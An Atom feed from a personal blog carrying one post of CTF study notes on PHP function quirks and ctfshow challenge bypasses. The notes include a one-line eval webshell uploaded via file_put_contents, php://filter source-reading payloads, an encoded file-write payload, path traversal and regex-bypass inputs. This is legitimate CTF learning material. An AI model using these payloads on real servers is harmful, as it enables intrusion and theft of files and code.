<?xml version="1.0"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://StarofEden.github.io</id>
    <title>StarofEden🌸 • Posts by &#34;网络安全&#34; category</title>
    <link href="https://StarofEden.github.io" />
    <updated>2024-11-06T16:00:00.000Z</updated>
    <category term="博客美化" />
    <category term="火狐插件" />
    <category term="web安全" />
    <category term="ctf" />
    <category term="blog 博客美化" />
    <entry>
        <id>https://starofeden.github.io/2024/11/07/php%E7%89%B9%E6%80%A7/</id>
        <title>php特性</title>
        <link rel="alternate" href="https://starofeden.github.io/2024/11/07/php%E7%89%B9%E6%80%A7/"/>
        <content type="html">&lt;h1 id=&#34;php特性&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#php特性&#34;&gt;#&lt;/a&gt; php 特性&lt;/h1&gt;
&lt;h2 id=&#34;php函数&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#php函数&#34;&gt;#&lt;/a&gt; php 函数&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;mark&gt;intval(&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;v&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;var,&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.625em;vertical-align:-0.1944em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.03588em;&#34;&gt;v&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;base)&lt;/mark&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;v&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mtext&gt;为数组时会返回&lt;/mtext&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;mtext&gt;，&lt;/mtext&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;var为数组时会返回1，&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.6833em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.03588em;&#34;&gt;v&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;为数组时会返回&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;，&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;base 为进制。 &lt;code&gt; base=0&lt;/code&gt; , 则表示根据 var 开始的数字决定使用的进制。绕过： &lt;code&gt;8进制&lt;/code&gt; ：010574（0 开头）  &lt;code&gt;16进制&lt;/code&gt; ：0x117 (0x 开头)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;遇到&lt;strong&gt;字母&lt;/strong&gt;或者&lt;strong&gt;符号&lt;/strong&gt;停止读取&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;mark&gt;strpos(string,find,start)&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://starofeden-blog.oss-cn-chengdu.aliyuncs.com/img/202410312046094.png&#34; alt=&#34;image-20241031204632014&#34;&gt;&lt;/p&gt;
&lt;p&gt;默认从 0 开始，有则&lt;span alt=&#34;solid&#34;&gt;返回第一次出现的位置&lt;/span&gt;，无则返回 false&lt;/p&gt;
&lt;p&gt;本例中若参数开头为 0 &lt;code&gt;?num=01110&lt;/code&gt;     strpos 函数会返回 0 并执行死亡程序&lt;/p&gt;
&lt;p&gt;绕过：&lt;span alt=&#34;solid&#34;&gt;参数中含有 0 但开头不能为 0&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;mark&gt;highlight_file($_GET[‘u’])&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;font&gt;用 php 伪协议&lt;/font&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;php:&lt;span class=&#34;comment&#34;&gt;//filter/resource=flag.php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;php:&lt;span class=&#34;comment&#34;&gt;//filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;php:&lt;span class=&#34;comment&#34;&gt;//filter/read=convert.quoted-printable-encode/resource=flag.php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;compress.zlib:&lt;span class=&#34;comment&#34;&gt;//flag.php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Php:&lt;span class=&#34;comment&#34;&gt;//filter/zlib.deflate|zlib.inflate/resource=flag.php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/blockquote&gt;
&lt;p&gt;参数 u 限制了不能等于 flag.php, 可用./flag.php&lt;br&gt;
 或者？u=php://filter/read=convert.base64-encode/resource=flag.php&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;mark&gt;in_array(search,array,type)&lt;/mark&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;type 为 TRUE 则 函数还会检查 search 的类型是否和 array 中的相同&lt;/p&gt;
&lt;p&gt;&lt;span alt=&#34;solid&#34;&gt;没有设置第 3 个参数则为弱类型比较&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://starofeden-blog.oss-cn-chengdu.aliyuncs.com/img/202411011324381.png&#34; alt=&#34;image-20241101132428315&#34;&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?n=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;.php   post:content=&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt; @&lt;span class=&#34;keyword&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;a&amp;#x27;&lt;/span&gt;]); &lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;details&gt;
    &lt;summary&gt;蚁剑连接问题&lt;/summary&gt;
    &lt;p&gt;出现错误：UNABLE_TO_VERIFY_LEAF_SIGNATURE&lt;/p&gt;
    &lt;p&gt;其他设置--&gt;勾选忽略HTTPS证书&lt;/p&gt;
&lt;/details&gt;
* ==file_put_contents==
&lt;ol&gt;
&lt;li&gt;考虑插入一句话木马&lt;/li&gt;
&lt;li&gt;使用伪协议&lt;span alt=&#34;solid&#34;&gt;如果文件不存在，将创建一个文件 &lt;/span&gt;，再写入查看源码的命令&lt;/li&gt;
&lt;li&gt;传入内容需要编码&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?=`cat *`;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;经过base64与16进制编码：&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;&lt;mark&gt;call_user_func&lt;/mark&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;nowamagic&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$b&lt;/span&gt;&lt;/span&gt;)   &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123;   &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;;   &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$b&lt;/span&gt;;   &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;   &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;call_user_func&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;nowamagic&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;111&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;222&amp;quot;&lt;/span&gt;);   &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;call_user_func&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;nowamagic&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;333&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;444&amp;quot;&lt;/span&gt;);   &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//显示 111 222 333 444   &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;a&lt;/span&gt; &lt;/span&gt;&amp;#123;   &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;b&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$c&lt;/span&gt;&lt;/span&gt;)   &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;    &lt;/span&gt;&amp;#123;   &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$c&lt;/span&gt;;   &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;   &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;   &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;call_user_func&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;array&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;a&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;b&amp;quot;&lt;/span&gt;),&lt;span class=&#34;string&#34;&gt;&amp;quot;111&amp;quot;&lt;/span&gt;);   &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//显示 111   &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;em&gt;() 是 gettext () 函数，一般是原封不动的输出参数&lt;br&gt;
？f1=&lt;/em&gt;&amp;amp;f2=get_defined_vars&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://starofeden-blog.oss-cn-chengdu.aliyuncs.com/img/202411070940375.png&#34; alt=&#34;image-20241107094045219&#34;&gt;&lt;/p&gt;
&lt;details&gt;
    &lt;summary&gt;遇到的坑&lt;/summary&gt;
    &lt;p&gt;本来想post传参：ctfshow=array(&#39;ctfshow&#39;,&#39;getFlag&#39;)&lt;/p&gt;
    &lt;p&gt;不成功，然后发现不能这样post数组&lt;/p&gt;
&lt;/details&gt;
&lt;blockquote&gt;
&lt;p&gt;ctfshow[0]=ctfshow&amp;amp;ctfshow[1]=getFlag&lt;br&gt;
ctfshow=ctfshow::getFlag&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;&lt;mark&gt;hex2bin()&lt;/mark&gt;&lt;br&gt;
&lt;span alt=&#34;solid&#34;&gt;把十六进制值转换为 ASCII 字符&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;把 call_user_func () 与 hex2bin () 结合起来？&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;mark&gt;is_numeric()&lt;/mark&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;处理的数字有限制，所以一旦过长可能返回 false；长度一般为 18&lt;/li&gt;
&lt;li&gt;前面增加&lt;kbd&gt;\x0c&lt;/kbd&gt;，&lt;kbd&gt;\f&lt;/kbd&gt;，&lt;kbd&gt;%0c&lt;/kbd&gt; &lt;code&gt;(url中)&lt;/code&gt;  可以通过&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$num&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;quot;\x0c36&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;is_numeric&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$num&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;yes&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;no&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;          &lt;span class=&#34;comment&#34;&gt;//yes&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;web102&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://starofeden-blog.oss-cn-chengdu.aliyuncs.com/img/202411011635459.png&#34; alt=&#34;image-20241101163549407&#34;&gt;&lt;/p&gt;
&lt;p&gt;v1 需要 post 一个函数能对 $s 进行处理，这里 post  hex2bin ()&lt;/p&gt;
&lt;p&gt;v2 是读取源码的 php 代码，必须是数字，用科学计数法绕过&lt;/p&gt;
&lt;p&gt;v3 是用伪协议创建的文件&lt;/p&gt;
&lt;details&gt;
    &lt;summary&gt;遇到的坑&lt;/summary&gt;
    &lt;p&gt;进过base64和hex之后，e后面必须全部为数字，所以要把=去掉&lt;/p&gt;
    &lt;p&gt;访问2.php，右键查看网页源代码&lt;/p&gt;
    &lt;p&gt;使用了伪协议后一般都要查看源码&lt;/p&gt;
&lt;/details&gt;
&lt;blockquote&gt;
&lt;p&gt;payload:&lt;/p&gt;
&lt;p&gt;?v2=115044383959474E6864434171594473&amp;amp;v3=php://filter/write=convert.base64-decode/resource=2.php&lt;br&gt;
post:v1=hex2bin&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;&lt;mark&gt;die()&lt;/mark&gt;&lt;br&gt;
 终止程序并输出括号内的提示信息&lt;/li&gt;
&lt;li&gt;&lt;mark&gt;is_file()&lt;/mark&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;if_file () 能处理的长度有限，超过一点长度就不认为是文件&lt;/p&gt;
&lt;p&gt;&lt;font&gt;/proc/self/root/&lt;/font&gt;  代表根目录&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;&lt;mark&gt;readfile()&lt;/mark&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;使用 php://filter   &lt;em&gt;中间的过滤器错误只会 warning，不影响&lt;/em&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;f=php://filter/ctfshow/resource=flag.php&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;目录穿越&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;…/…/…/var/www/html/flag.php&lt;/p&gt;
&lt;h2 id=&#34;正则匹配绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#正则匹配绕过&#34;&gt;#&lt;/a&gt; 正则匹配绕过&lt;/h2&gt;
&lt;h3 id=&#34;preg_match&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#preg_match&#34;&gt;#&lt;/a&gt; preg_match&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;mark&gt;m 多行模式&lt;/mark&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;参数为数组时会报错返回 0&lt;br&gt;
&lt;mark&gt;$&lt;/mark&gt; 匹配结尾位置 &lt;!--如果设置了 RegExp 对象的 Multiline 属性，则 $ 也匹配 ‘\n’ 或 ‘\r’--&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;preg_match&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;/^php$/im&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;)) &lt;span class=&#34;comment&#34;&gt;//m多行模式，某一行匹配到就通过&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;preg_match&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;/^php$/i&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;))  &lt;span class=&#34;comment&#34;&gt;//单行模式，因为有个%0a换行符，则只在第一行匹配&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;绕过：aaa%0Aphp&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/qq_46091464/article/details/108278486&#34;&gt;https://blog.csdn.net/qq_46091464/article/details/108278486&lt;/a&gt;  Apache HTTPD 换行解析漏洞 (CVE-2017-15715) 与拓展&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;mark&gt;传址&lt;/mark&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://starofeden-blog.oss-cn-chengdu.aliyuncs.com/img/202410312155207.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;最后一行为三元运算符，需要 $_GET [‘HTTP_FLAG’]==‘flag’&lt;/p&gt;
&lt;p&gt;&lt;code&gt;$_GET?$_GET=&amp;amp;$_POST:&#39;flag&#39;; &lt;/code&gt; &lt;br&gt;
使用 ==&amp;amp;== 改变了 get 方法的地址，将 get 变成了 post&lt;br&gt;
payload:url 随便传值，post:HTTP_FLAG=flag&lt;/p&gt;
&lt;p&gt;解法 2：post:flag=flag   cookie:HTTP_FLAG=flag&lt;/p&gt;
&lt;h3 id=&#34;ereg&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ereg&#34;&gt;#&lt;/a&gt; &lt;mark&gt;ereg()&lt;/mark&gt;&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;只能处理字符串，遇见数组返回 null&lt;/li&gt;
&lt;li&gt;00 截断    &lt;code&gt;a%00123&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;溢出&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#溢出&#34;&gt;#&lt;/a&gt; 溢出&lt;/h3&gt;
&lt;p&gt;当要匹配的字符串过长，正则表达式就会失效。默认最大长度是 10 万&lt;/p&gt;
